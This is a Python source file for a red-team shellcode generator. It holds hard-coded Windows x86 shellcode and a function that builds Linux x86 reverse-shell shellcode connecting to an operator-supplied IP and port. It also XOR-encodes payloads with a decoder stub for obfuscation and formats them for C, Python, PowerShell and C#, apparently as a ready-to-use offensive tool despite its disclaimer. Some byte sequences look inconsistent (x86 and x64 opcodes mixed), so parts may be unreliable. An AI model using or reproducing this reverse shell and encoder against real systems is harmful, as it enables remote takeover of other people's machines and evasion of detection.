#!/usr/bin/env python3
"""
Red Team Tools - Shellcode Generator
For educational and authorized security testing only
"""

import struct
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *


class ShellcodeGenerator:
    """Basic shellcode generator and encoder"""
    
    # Common shellcode templates (x86)
    SHELLCODE_TEMPLATES = {
        "exec_calc_x86": {
            "description": "Execute calc.exe (Windows x86)",
            "platform": "windows",
            "arch": "x86",
            "shellcode": (
                b"\x31\xc0\x50\x68\x63\x61\x6c\x63"
                b"\x54\x59\x50\x40\x92\x74\x15\x51"
                b"\x64\x8b\x72\x2f\xad\x8b\x30\x8b"
                b"\x7e\x18\xb2\x50\xeb\x1a\xb2\x60"
                b"\x48\x29\xd4\x65\x48\x8b\x32\x48"
                b"\x8b\x76\x18\x48\x8b\x76\x10\x48"
                b"\xad\x48\x8b\x30\x48\x8b\x7e\x30"
                b"\x03\x57\x3c\x8b\x5c\x17\x28\x8b"
                b"\x74\x1f\x20\x48\x01\xfe\x8b\x54"
                b"\x1f\x24\x0f\xb7\x2c\x17\x8d\x52"
                b"\x02\xad\x81\x3c\x07\x57\x69\x6e"
                b"\x45\x75\xef\x8b\x74\x1f\x1c\x48"
                b"\x01\xfe\x8b\x34\xae\x48\x01\xf7"
                b"\x99\xff\xd7"
            )
        },
        "messagebox_x86": {
            "description": "MessageBox (Windows x86)",
            "platform": "windows",
            "arch": "x86",
            "shellcode": (
                b"\x31\xd2\xb2\x30\x64\x8b\x12\x8b"
                b"\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
                b"\x8b\x72\x20\x8b\x12\x80\x7e\x0c"
                b"\x33\x75\xf2\x89\xc7\x03\x78\x3c"
                b"\x8b\x57\x78\x01\xc2\x8b\x7a\x20"
                b"\x01\xc7\x31\xed\x8b\x34\xaf\x01"
                b"\xc6\x45\x81\x3e\x46\x61\x74\x61"
                b"\x75\xf2\x81\x7e\x08\x45\x78\x69"
                b"\x74\x75\xe9\x8b\x7a\x24\x01\xc7"
                b"\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
                b"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68"
                b"\x21\x21\x00\x00\x68\x63\x6b\x65"
                b"\x64\x68\x48\x61\x63\x6b\x89\xe1"
                b"\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"
            )
        },
        "reverse_shell_template": {
            "description": "Reverse shell template (needs IP/port)",
            "platform": "linux",
            "arch": "x86",
            "shellcode": None,  # Generated dynamically
            "template": True
        }
    }
    
    def __init__(self):
        pass
    
    def list_shellcodes(self):
        """List available shellcode templates"""
        print(f"\n{C}Available Shellcode Templates:{RESET}")
        for name, sc in self.SHELLCODE_TEMPLATES.items():
            print(f"\n  {Y}[{name}]{RESET}")
            print(f"    Description: {sc['description']}")
            print(f"    Platform: {sc['platform']}")
            print(f"    Architecture: {sc['arch']}")
            if sc.get('shellcode'):
                print(f"    Size: {len(sc['shellcode'])} bytes")
    
    def get_shellcode(self, name: str) -> bytes:
        """Get shellcode by name"""
        if name not in self.SHELLCODE_TEMPLATES:
            error(f"Shellcode '{name}' not found")
            return b""
        
        return self.SHELLCODE_TEMPLATES[name].get('shellcode', b'')
    
    def generate_reverse_shell(self, ip: str, port: int, arch: str = "x86") -> bytes:
        """Generate reverse shell shellcode"""
        # Convert IP to bytes
        ip_parts = [int(x) for x in ip.split('.')]
        ip_bytes = bytes(ip_parts)
        
        # Convert port to bytes (big endian)
        port_bytes = struct.pack(">H", port)
        
        if arch == "x86":
            # Linux x86 reverse shell
            shellcode = (
                b"\x31\xc0"              # xor eax, eax
                b"\x31\xdb"              # xor ebx, ebx
                b"\x31\xc9"              # xor ecx, ecx
                b"\x31\xd2"              # xor edx, edx
                b"\x50"                  # push eax
                b"\x6a\x01"              # push 0x1
                b"\x6a\x02"              # push 0x2
                b"\x89\xe1"              # mov ecx, esp
                b"\xb0\x66"              # mov al, 0x66 (socketcall)
                b"\xb3\x01"              # mov bl, 0x1 (socket)
                b"\xcd\x80"              # int 0x80
                b"\x89\xc6"              # mov esi, eax (save socket fd)
                b"\x68" + ip_bytes +     # push IP address
                b"\x66\x68" + port_bytes +  # push port
                b"\x66\x6a\x02"          # push 0x2 (AF_INET)
                b"\x89\xe1"              # mov ecx, esp
                b"\x6a\x10"              # push 0x10 (sizeof sockaddr)
                b"\x51"                  # push ecx
                b"\x56"                  # push esi (socket fd)
                b"\x89\xe1"              # mov ecx, esp
                b"\xb0\x66"              # mov al, 0x66
                b"\xb3\x03"              # mov bl, 0x3 (connect)
                b"\xcd\x80"              # int 0x80
                b"\x89\xf3"              # mov ebx, esi
                b"\x31\xc9"              # xor ecx, ecx
                b"\xb1\x02"              # mov cl, 0x2
                b"\xb0\x3f"              # mov al, 0x3f (dup2)
                b"\xcd\x80"              # int 0x80
                b"\x49"                  # dec ecx
                b"\x79\xf9"              # jns (loop)
                b"\x31\xc0"              # xor eax, eax
                b"\x50"                  # push eax
                b"\x68\x2f\x2f\x73\x68"  # push "//sh"
                b"\x68\x2f\x62\x69\x6e"  # push "/bin"
                b"\x89\xe3"              # mov ebx, esp
                b"\x50"                  # push eax
                b"\x53"                  # push ebx
                b"\x89\xe1"              # mov ecx, esp
                b"\xb0\x0b"              # mov al, 0xb (execve)
                b"\xcd\x80"              # int 0x80
            )
        else:
            warning("Only x86 architecture supported for reverse shell")
            return b""
        
        return shellcode
    
    def encode_xor(self, shellcode: bytes, key: int = 0x41) -> bytes:
        """XOR encode shellcode"""
        encoded = bytes([b ^ key for b in shellcode])
        return encoded
    
    def encode_alphanumeric(self, shellcode: bytes) -> str:
        """Convert shellcode to alphanumeric (basic base64-like)"""
        import base64
        return base64.b64encode(shellcode).decode()
    
    def generate_decoder_stub(self, key: int = 0x41, length: int = 0) -> bytes:
        """Generate XOR decoder stub (x86)"""
        # Simple XOR decoder
        stub = (
            b"\xeb\x0b"              # jmp short to call
            b"\x5e"                  # pop esi
            b"\x31\xc9"              # xor ecx, ecx
            b"\xb1" + bytes([length]) +  # mov cl, length
            b"\x80\x36" + bytes([key]) +  # xor byte [esi], key
            b"\x46"                  # inc esi
            b"\xe2\xfa"              # loop
            b"\xeb\x05"              # jmp to shellcode
            b"\xe8\xf0\xff\xff\xff"  # call back to pop
        )
        return stub
    
    def format_shellcode(self, shellcode: bytes, format_type: str = "c") -> str:
        """Format shellcode for different languages"""
        if format_type == "c":
            # C format
            hex_str = ''.join([f'\\x{b:02x}' for b in shellcode])
            return f'unsigned char shellcode[] = "{hex_str}";'
        
        elif format_type == "python":
            # Python format
            hex_str = ''.join([f'\\x{b:02x}' for b in shellcode])
            return f'shellcode = b"{hex_str}"'
        
        elif format_type == "powershell":
            # PowerShell format
            hex_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
            return f'[Byte[]] $shellcode = @({hex_bytes})'
        
        elif format_type == "csharp":
            # C# format
            hex_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
            return f'byte[] shellcode = new byte[{len(shellcode)}] {{{hex_bytes}}};'
        
        elif format_type == "hex":
            # Raw hex
            return shellcode.hex()
        
        elif format_type == "raw":
            return repr(shellcode)
        
        else:
            return shellcode.hex()
    
    def analyze_shellcode(self, shellcode: bytes) -> dict:
        """Basic shellcode analysis"""
        analysis = {
            "size": len(shellcode),
            "null_bytes": shellcode.count(b'\x00'),
            "has_null": b'\x00' in shellcode,
            "printable_ratio": sum(1 for b in shellcode if 32 <= b <= 126) / len(shellcode) if shellcode else 0,
            "common_patterns": []
        }
        
        # Check for common patterns
        patterns = {
            b"\xcd\x80": "Linux syscall (int 0x80)",
            b"\x0f\x05": "Linux syscall (syscall)",
            b"\xff\xd7": "Windows call edi",
            b"\xff\xe4": "jmp esp",
            b"/bin/sh": "Shell string",
            b"cmd.exe": "CMD string",
            b"WinExec": "WinExec API",
        }
        
        for pattern, desc in patterns.items():
            if pattern in shellcode:
                analysis["common_patterns"].append(desc)
        
        return analysis


def interactive_mode():
    """Interactive mode for shellcode generation"""
    print_banner("SHELLCODE GEN", color="red")
    warning("For educational and authorized security testing only!")
    
    gen = ShellcodeGenerator()
    
    options = [
        "List Available Shellcodes",
        "Generate Reverse Shell",
        "Encode Shellcode (XOR)",
        "Format Shellcode",
        "Analyze Shellcode"
    ]
    
    choice = menu_selector(options, "Select Option")
    
    if choice == 0:
        return
    
    elif choice == 1:
        gen.list_shellcodes()
    
    elif choice == 2:
        ip = prompt("Enter LHOST (your IP)")
        port = int(prompt("Enter LPORT") or "4444")
        
        shellcode = gen.generate_reverse_shell(ip, port)
        
        if shellcode:
            print(f"\n{G}Generated Reverse Shell ({len(shellcode)} bytes):{RESET}")
            
            format_type = prompt("Output format (c/python/powershell/hex)") or "python"
            formatted = gen.format_shellcode(shellcode, format_type)
            print(f"\n{formatted}")
            
            if confirm("Encode with XOR?"):
                key = int(prompt("XOR key (decimal)") or "65")
                encoded = gen.encode_xor(shellcode, key)
                print(f"\n{Y}Encoded ({len(encoded)} bytes):{RESET}")
                print(gen.format_shellcode(encoded, format_type))
    
    elif choice == 3:
        print("Enter shellcode (hex format, e.g., 31c050...):")
        hex_input = prompt("Hex")
        
        try:
            shellcode = bytes.fromhex(hex_input)
            key = int(prompt("XOR key (decimal)") or "65")
            
            encoded = gen.encode_xor(shellcode, key)
            
            print(f"\n{G}Original ({len(shellcode)} bytes):{RESET}")
            print(gen.format_shellcode(shellcode, "python"))
            
            print(f"\n{Y}Encoded with key {key} ({len(encoded)} bytes):{RESET}")
            print(gen.format_shellcode(encoded, "python"))
        except:
            error("Invalid hex input")
    
    elif choice == 4:
        gen.list_shellcodes()
        name = prompt("\nSelect shellcode name")
        
        shellcode = gen.get_shellcode(name)
        if shellcode:
            format_type = prompt("Output format (c/python/powershell/csharp/hex)") or "python"
            formatted = gen.format_shellcode(shellcode, format_type)
            print(f"\n{formatted}")
    
    elif choice == 5:
        print("Enter shellcode (hex format):")
        hex_input = prompt("Hex")
        
        try:
            shellcode = bytes.fromhex(hex_input)
            analysis = gen.analyze_shellcode(shellcode)
            
            print(f"\n{C}Shellcode Analysis:{RESET}")
            print(f"  Size: {analysis['size']} bytes")
            print(f"  Null bytes: {analysis['null_bytes']}")
            print(f"  Has null: {analysis['has_null']}")
            print(f"  Printable ratio: {analysis['printable_ratio']:.1%}")
            
            if analysis['common_patterns']:
                print(f"  Patterns detected:")
                for p in analysis['common_patterns']:
                    print(f"    - {p}")
        except:
            error("Invalid hex input")


if __name__ == "__main__":
    interactive_mode()
